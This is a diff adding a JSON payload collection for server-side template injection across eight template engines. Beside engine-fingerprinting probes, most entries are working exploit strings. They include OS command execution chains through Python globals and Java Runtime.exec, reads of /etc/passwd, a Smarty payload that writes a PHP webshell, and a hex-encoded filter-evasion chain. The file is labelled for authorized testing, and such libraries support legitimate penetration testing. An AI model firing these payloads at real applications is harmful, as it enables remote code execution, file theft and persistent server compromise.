@@ -1,0 +1,58 @@
+{
+  "meta": {
+    "name": "Server-Side Template Injection",
+    "icon": "🧱",
+    "description": "SSTI detection and exploitation payloads for Jinja2, Twig, Freemarker, Velocity, Smarty, ERB, Pebble, and Mako. Includes probes, engine fingerprinting, and RCE chains. For authorized testing only.",
+    "version": "1.0",
+    "updated": "2026-03-04",
+    "total": 37
+  },
+  "payloads": [
+    {"id":1,"code":"{{7*7}}","description":"Generic multiply probe — 49 confirms Jinja2/Twig/Pebble; echoed back means no SSTI","category":"probe","platform":["jinja2","twig","pebble","generic"],"tags":["probe","multiply","detection"]},
+    {"id":2,"code":"${7*7}","description":"Dollar-brace probe — 49 confirms Freemarker/Velocity/Mako/Groovy","category":"probe","platform":["freemarker","velocity","mako","generic"],"tags":["probe","multiply","detection"]},
+    {"id":3,"code":"#{7*7}","description":"Hash-brace probe — used in some Expression Language (EL) contexts","category":"probe","platform":["generic","el"],"tags":["probe","el","detection"]},
+    {"id":4,"code":"<%= 7*7 %>","description":"ERB/EJS probe — 49 confirms Ruby ERB or JavaScript EJS rendering","category":"probe","platform":["erb","ejs"],"tags":["probe","erb","ejs","detection"]},
+    {"id":5,"code":"{{7*'7'}}","description":"Engine fingerprint — Jinja2 returns 49; Twig returns 7777777","category":"probe","platform":["jinja2","twig"],"tags":["probe","fingerprint","jinja2","twig"]},
+
+    {"id":6,"code":"{{config}}","description":"Jinja2 — dumps Flask/Django config object including SECRET_KEY","category":"jinja2","platform":["jinja2"],"tags":["jinja2","info-disclosure","flask","config"]},
+    {"id":7,"code":"{{self}}","description":"Jinja2 — leaks internal template object reference","category":"jinja2","platform":["jinja2"],"tags":["jinja2","info-disclosure"]},
+    {"id":8,"code":"{{''.__class__.__mro__}}","description":"Jinja2 MRO dump — reveals class hierarchy for gadget chain construction","category":"jinja2","platform":["jinja2"],"tags":["jinja2","mro","sandbox-escape"]},
+    {"id":9,"code":"{{''.__class__.__mro__[1].__subclasses__()}}","description":"Jinja2 subclasses list — enumerate all loaded Python classes for gadget selection","category":"jinja2","platform":["jinja2"],"tags":["jinja2","subclasses","sandbox-escape"]},
+    {"id":10,"code":"{{config.__class__.__init__.__globals__['os'].popen('id').read()}}","description":"Jinja2 RCE via globals() os.popen — executes OS command through Flask config class","category":"jinja2","platform":["jinja2"],"tags":["jinja2","rce","os","popen"]},
+    {"id":11,"code":"{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}","description":"Jinja2 RCE via Flask request object builtins chain","category":"jinja2","platform":["jinja2"],"tags":["jinja2","rce","flask","request"]},
+    {"id":12,"code":"{{''.__class__.__mro__[1].__subclasses__()[SUBPROCESS_INDEX](['id'],stdout=-1).communicate()}}","description":"Jinja2 subprocess RCE — replace SUBPROCESS_INDEX with index of subprocess.Popen class","category":"jinja2","platform":["jinja2"],"tags":["jinja2","rce","subprocess"]},
+    {"id":13,"code":"{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}","description":"Jinja2 RCE via warnings module builtins — works when direct os access is sandboxed","category":"jinja2","platform":["jinja2"],"tags":["jinja2","rce","warnings","sandbox-escape"]},
+
+    {"id":14,"code":"{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}","description":"Twig RCE via registerUndefinedFilterCallback — classic Twig 1.x exploit","category":"twig","platform":["twig"],"tags":["twig","rce","filter","classic"]},
+    {"id":15,"code":"{{['id']|map('system')|join}}","description":"Twig RCE via map+system filter (PHP 7 Twig)","category":"twig","platform":["twig"],"tags":["twig","rce","system"]},
+    {"id":16,"code":"{{app.request.server.get('DOCUMENT_ROOT')}}","description":"Twig info leak — reads server environment variable via app.request","category":"twig","platform":["twig"],"tags":["twig","info-disclosure","server-env"]},
+    {"id":17,"code":"{{dump(app)}}","description":"Twig Symfony context dump — reveals application object in debug mode","category":"twig","platform":["twig"],"tags":["twig","info-disclosure","symfony"]},
+
+    {"id":18,"code":"${\"freemarker.template.utility.Execute\"?new()(\"id\")}","description":"Freemarker RCE via Execute class instantiation — classic direct RCE","category":"freemarker","platform":["freemarker"],"tags":["freemarker","rce","execute","java"]},
+    {"id":19,"code":"<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}","description":"Freemarker RCE via #assign directive — same Execute gadget, alternate syntax","category":"freemarker","platform":["freemarker"],"tags":["freemarker","rce","execute"]},
+    {"id":20,"code":"${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(',')}","description":"Freemarker LFI via Java URL chain — reads local file as byte array","category":"freemarker","platform":["freemarker"],"tags":["freemarker","lfi","java"]},
+
+    {"id":21,"code":"#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()","description":"Velocity RCE via java.lang.Runtime.exec() — classic Velocity exploitation chain","category":"velocity","platform":["velocity"],"tags":["velocity","rce","runtime","java"]},
+    {"id":22,"code":"$class.inspect(\"java.lang.Runtime\", Class).type.getRuntime().exec(\"id\")","description":"Velocity RCE via $class.inspect gadget — alternative runtime exec pattern","category":"velocity","platform":["velocity"],"tags":["velocity","rce","inspect"]},
+
+    {"id":23,"code":"{$smarty.version}","description":"Smarty info leak — reveals Smarty template engine version","category":"smarty","platform":["smarty"],"tags":["smarty","info-disclosure","version"]},
+    {"id":24,"code":"{php}echo `id`;{/php}","description":"Smarty v3 {php} tag RCE — backtick execution (requires allow_php_tag=true)","category":"smarty","platform":["smarty"],"tags":["smarty","rce","php-tag"]},
+    {"id":25,"code":"{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['c']);?>\",self::clearConfig())}","description":"Smarty RCE via Smarty_Internal_Write_File — writes webshell to disk","category":"smarty","platform":["smarty"],"tags":["smarty","rce","webshell"]},
+
+    {"id":26,"code":"<%= 7 * 7 %>","description":"ERB math probe — 49 confirms Ruby ERB rendering","category":"erb","platform":["erb"],"tags":["erb","probe","ruby"]},
+    {"id":27,"code":"<%= system('id') %>","description":"ERB RCE via Kernel#system — executes OS command in Ruby ERB template","category":"erb","platform":["erb"],"tags":["erb","rce","system","ruby"]},
+    {"id":28,"code":"<%= `id` %>","description":"ERB backtick RCE — backtick command substitution in Ruby","category":"erb","platform":["erb"],"tags":["erb","rce","backtick","ruby"]},
+    {"id":29,"code":"<%= File.open('/etc/passwd').read %>","description":"ERB LFI — reads local file via Ruby File.open","category":"erb","platform":["erb"],"tags":["erb","lfi","file-read","ruby"]},
+
+    {"id":30,"code":"${os.popen('id').read()}","description":"Mako/Python RCE via os.popen — works if os is available in Mako template namespace","category":"mako","platform":["mako"],"tags":["mako","rce","os","python"]},
+    {"id":31,"code":"<%\nimport os\nx=os.popen('id').read()\n%>${x}","description":"Mako module-level import RCE — uses <% %> block to import os and exec command","category":"mako","platform":["mako"],"tags":["mako","rce","import","python"]},
+
+    {"id":32,"code":"{{ 7 * 7 }}","description":"Pebble/general probe — 49 confirms Pebble Java template engine","category":"pebble","platform":["pebble"],"tags":["pebble","probe"]},
+    {"id":33,"code":"{% import java.io.* %}{%- set run = Runtime.exec('id') -%}","description":"Pebble RCE via java.lang.Runtime import and exec","category":"pebble","platform":["pebble"],"tags":["pebble","rce","java","runtime"]},
+
+    {"id":34,"code":"{{7*7}}${7*7}#{7*7}<%= 7*7 %>","description":"Polyglot SSTI probe — tests multiple engine syntaxes in one payload","category":"probe","platform":["generic"],"tags":["probe","polyglot","fingerprint"]},
+    {"id":35,"code":"{{''.__class__}}","description":"Jinja2/Python class probe — confirms Python object access via template","category":"probe","platform":["jinja2"],"tags":["probe","jinja2","python","class"]},
+    {"id":36,"code":"{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()}}","description":"Jinja2 WAF bypass — hex-encoded attribute names to evade underscore filters","category":"jinja2","platform":["jinja2"],"tags":["jinja2","rce","bypass","hex","underscore"]},
+    {"id":37,"code":"{{namespace.__init__.__globals__.os.popen('id').read()}}","description":"Jinja2 RCE via namespace object globals — works in some Flask versions","category":"jinja2","platform":["jinja2"],"tags":["jinja2","rce","namespace","flask"]}
+  ]
+}
